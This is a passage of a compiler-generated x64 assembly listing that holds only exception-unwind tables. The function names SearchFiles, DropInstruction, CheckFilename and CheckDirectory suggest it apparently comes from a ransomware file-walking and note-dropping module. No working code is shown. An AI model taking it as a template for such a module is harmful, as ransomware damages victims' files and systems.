	DD	imagerel $LN63+290
	DD	imagerel $chain$5$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63+290
	DD	imagerel $LN63+296
	DD	imagerel $chain$6$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63+296
	DD	imagerel $LN63+302
	DD	imagerel $chain$7$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD imagerel $LN41
	DD	imagerel $LN41+61
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD imagerel $LN41+61
	DD	imagerel $LN41+124
	DD	imagerel $chain$1$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD imagerel $LN41+124
	DD	imagerel $LN41+204
	DD	imagerel $chain$2$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z DD imagerel $LN25
	DD	imagerel $LN25+96
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z DD imagerel $LN21
	DD	imagerel $LN21+109
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN77
	DD	imagerel $LN77+295
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN76
	DD	imagerel $LN76+77
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN76+77
	DD	imagerel $LN76+302
	DD	imagerel $chain$0$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN76+302
	DD	imagerel $LN76+314
	DD	imagerel $chain$2$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD imagerel $LN76+314
	DD	imagerel $LN76+320
	DD	imagerel $chain$3$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD imagerel $LN26
	DD	imagerel $LN26+40
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD imagerel $LN26+40
	DD	imagerel $LN26+109
	DD	imagerel $chain$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD imagerel $LN26+109
	DD	imagerel $LN26+123
	DD	imagerel $chain$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1directory_info_@@QEAA@XZ DD imagerel $LN39
	DD	imagerel $LN39+97
	DD	imagerel $unwind$??1directory_info_@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gdirectory_info_@@QEAAPEAXI@Z DD imagerel $LN43
	DD	imagerel $LN43+111
	DD	imagerel $unwind$??_Gdirectory_info_@@QEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z DD imagerel $LN1829
	DD	imagerel $LN1829+3650
	DD	imagerel $unwind$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN296
	DD	imagerel $LN296+255
	DD	imagerel $unwind$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD imagerel $LN296+255
	DD	imagerel $LN296+1137
	DD	imagerel $chain$4$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckFilename@@YAHPEB_W@Z DD imagerel $LN394
	DD	imagerel $LN394+1546
	DD	imagerel $unwind$?CheckFilename@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckDirectory@@YAHPEB_W@Z DD imagerel $LN654
	DD	imagerel $LN654+2346
	DD	imagerel $unwind$?CheckDirectory@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD imagerel $LN305
	DD	imagerel $LN305+344
	DD	imagerel $unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD imagerel $LN305+344
	DD	imagerel $LN305+554
	DD	imagerel $chain$2$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD imagerel $LN305+554
	DD	imagerel $LN305+1014
	DD	imagerel $chain$3$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z DD imagerel $LN229
	DD	imagerel $LN229+813
	DD	imagerel $unwind$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpW@@YAHPEB_W0@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?plstrcmpW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindClose@@YAHPEAX@Z DD imagerel $LN4
	DD	imagerel $LN4+40
	DD	imagerel $unwind$?pFindClose@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z DD imagerel $LN4
	DD	imagerel $LN4+55
	DD	imagerel $unwind$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?pFindClose@@YAHPEAX@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?plstrcmpW@@YAHPEB_W0@Z DD 040a01H
	DD	06340aH
	DD	07006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z DD 093701H
	DD	0187437H
	DD	0193415H
	DD	0120115H
	DD	06007e009H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD 021H
	DD	imagerel $LN305
	DD	imagerel $LN305+344
	DD	imagerel $unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD 041021H
	DD	016f410H
	DD	017e408H
	DD	imagerel $LN305
	DD	imagerel $LN305+344
	DD	imagerel $unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD 094001H
	DD	0213440H
	DD	0180114H
	DD	0c006d008H
	DD	060037004H
	DD	05002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckDirectory@@YAHPEB_W@Z DD 071a01H
	DD	037741aH
	DD	036341aH
	DD	034011aH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?CheckFilename@@YAHPEB_W@Z DD 071701H
	DD	0237417H
	DD	0223417H
	DD	0200117H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 0a3221H
	DD	0137832H
	DD	014682aH
	DD	033f422H
	DD	032e415H
	DD	031d408H
	DD	imagerel $LN296
	DD	imagerel $LN296+255
	DD	imagerel $unwind$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z DD 072119H
	DD	02a0113H
	DD	07005c007H
	DD	030036004H
	DD	05002H
	DD	imagerel __GSHandlerCheck
	DD	0128H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z DD 0a2d19H
	DD	0e5011cH
	DD	0e00bf00dH
	DD	0c007d009H
	DD	060047005H
	DD	050023003H
	DD	imagerel __GSHandlerCheck
	DD	0710H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??_Gdirectory_info_@@QEAAPEAXI@Z DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1directory_info_@@QEAA@XZ DD 020601H
	DD	030023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD 021H
	DD	imagerel $LN26
	DD	imagerel $LN26+40
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD 040a21H
	DD	07640aH
	DD	063405H
	DD	imagerel $LN26
	DD	imagerel $LN26+40
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z DD 020601H
	DD	070023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 021H
	DD	imagerel $LN76
	DD	imagerel $LN76+77
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 020021H
	DD	0c7400H
	DD	imagerel $LN76
	DD	imagerel $LN76+77
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 020521H
	DD	0c7405H
	DD	imagerel $LN76
	DD	imagerel $LN76+77
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z DD 060c01H
	DD	0f008320cH
	DD	06004e006H
	DD	030025003H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD 060c01H
	DD	0a340cH
	DD	07008320cH
	DD	050066007H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z DD 020601H
	DD	030027206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z DD 020601H
	DD	030027206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD 021H
	DD	imagerel $LN41
	DD	imagerel $LN41+61
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD 040e21H
	DD	09640eH
	DD	085405H
	DD	imagerel $LN41
	DD	imagerel $LN41+61
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD 061001H
	DD	0b7410H
	DD	0a3410H
	DD	0e00c5210H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 040021H
	DD	04e400H
	DD	0d7400H
	DD	imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 021H
	DD	imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 040021H
	DD	04e400H
	DD	0d7400H
	DD	imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 040821H
	DD	0d7408H
	DD	04e400H
	DD	imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$0$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 020521H
	DD	04e405H
	DD	imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 050a01H
	DD	0f006420aH
	DD	050036004H
	DD	03002H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 060c01H
	DD	0b340cH
	DD	07008320cH
	DD	050066007H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD 021H
	DD	imagerel $LN22
	DD	imagerel $LN22+45
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD 040e21H
	DD	09740eH
	DD	086405H
	DD	imagerel $LN22
	DD	imagerel $LN22+45
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z DD 0a1401H
	DD	0d3414H
	DD	0f0103214H
	DD	0d00ce00eH
	DD	07008c00aH
	DD	050066007H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 021H
	DD	imagerel $LN14
	DD	imagerel $LN14+28
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 040e21H
	DD	09740eH
	DD	086405H
	DD	imagerel $LN14
	DD	imagerel $LN14+28
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD 020601H
	DD	030025206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z DD 081501H
	DD	087415H
	DD	076415H
	DD	063415H
	DD	0e0113215H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 080021H
	DD	04f400H
	DD	05c400H
	DD	065400H
	DD	0e3400H
	DD	imagerel $LN99
	DD	imagerel $LN99+46
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 021H
	DD	imagerel $LN99
	DD	imagerel $LN99+46
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 080021H
	DD	04f400H
	DD	05c400H
	DD	065400H
	DD	0e3400H
	DD	imagerel $LN99
	DD	imagerel $LN99+46
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 081b21H
	DD	04f41bH
	DD	05c416H
	DD	06540dH
	DD	0e3405H
	DD	imagerel $LN99
	DD	imagerel $LN99+46
